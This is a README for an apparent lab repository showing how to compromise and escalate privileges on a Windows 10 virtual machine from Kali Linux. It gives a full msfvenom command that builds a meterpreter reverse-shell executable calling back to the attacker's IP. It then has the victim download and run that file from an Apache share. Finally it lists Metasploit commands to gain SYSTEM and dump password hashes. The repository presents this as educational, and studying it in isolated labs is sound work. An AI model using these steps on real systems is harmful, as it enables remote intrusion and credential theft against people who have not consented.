# Privilege Escalation 

## Overview
This repository contains scripts and instructions for demonstrating privilege escalation on a Windows 10 virtual machine using Kali Linux as the attacker machine. The lab showcases:

- Setting up a fake server using Apache.
- Generating a malicious payload with msfvenom.
- Exploiting a Windows system with Metasploit.
- Escalating privileges and extracting sensitive information.

## Requirements

- **Kali Linux VM**
  - Installed with Metasploit and msfvenom.
  - Network configured to communicate with the Windows VM.
- **Windows 10 VM**
  - Network configured to communicate with Kali.
- Tools used:
  - Apache2
  - Metasploit Framework


## Setup Instructions

### 1. Setting Up Apache on Kali
- Run the `setup_apache.sh` script to configure Apache and share the malicious payload.

```bash
chmod +x scripts/setup_apache.sh
./scripts/setup_apache.sh
```

### 2. Generating the Payload
- Use `msfvenom` to create a malicious payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe > ~/Desktop/Exploit.exe
```

### 3. Preparing Metasploit
- Run the `metasploit_commands.sh` script to set up Metasploit and listen for incoming connections.

```bash
chmod +x scripts/metasploit_commands.sh
./scripts/metasploit_commands.sh
```

### 4. Running the Payload on Windows
- On the Windows VM, navigate to the shared Apache folder and execute the `Exploit.exe` file.

```bash
http://<Kali_IP>/share/Exploit.exe
```

### 5. Interacting with the Exploit
- Use Metasploit to interact with the opened session, escalate privileges, and extract sensitive information.

## Key Commands

### Metasploit Basic Commands
```bash
sessions -i <ID>    # Interact with an active session.
getsystem           # Attempt privilege escalation.
run post/windows/gather/smart_hashdump  # Dump password hashes.
```

## Notes
- This lab is for educational purposes only. Ensure you have permission to test the target system.
- Always use a secure network and isolated environments for these activities.

